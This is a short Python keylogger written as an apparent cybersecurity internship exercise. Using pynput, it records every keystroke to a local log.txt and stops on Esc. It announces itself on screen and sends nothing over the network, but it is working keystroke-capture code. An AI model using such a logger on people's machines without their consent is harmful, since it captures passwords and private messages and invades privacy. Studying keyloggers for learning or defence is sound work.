# Prodigy InfoTech - Cyber Security Internship
# Task 04: Basic Keylogger
# Disclaimer: This project is created for educational and ethical learning purposes only.

from pynput.keyboard import Key, Listener

log_file = "log.txt"

def write_to_file(key):
    letter = str(key)
    # Remove single quotes around characters like 'a' -> a
    letter = letter.replace("'", "")

    # Handle special keys for readable formatting
    if letter == "Key.space":
        letter = " "
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.tab":
        letter = "\t"
    elif letter == "Key.backspace":
        letter = " [BACKSPACE] "
    elif letter in ("Key.shift", "Key.shift_r", "Key.shift_l"):
        letter = ""
    elif letter in ("Key.ctrl", "Key.ctrl_l", "Key.ctrl_r"):
        letter = " [CTRL] "
    elif letter == "Key.esc":
        print("\n[INFO] Exiting keylogger...")
        return False  # Stops the listener when Esc is pressed
    elif letter.startswith("Key."):
        # Format any other special keys like [ALT], [CAPS_LOCK], etc.
        key_name = letter.replace("Key.", "").upper()
        letter = f" [{key_name}] "

    # Append keystroke to the log file
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(letter)


if __name__ == "__main__":
    print("=" * 50)
    print("  Prodigy InfoTech - Cyber Security Task 04: Keylogger")
    print("  [INFO] Keystrokes are being logged to 'log.txt'")
    print("  [INFO] Press 'ESC' to stop the keylogger.")
    print("=" * 50)

    with Listener(on_press=write_to_file) as listener:
        listener.join()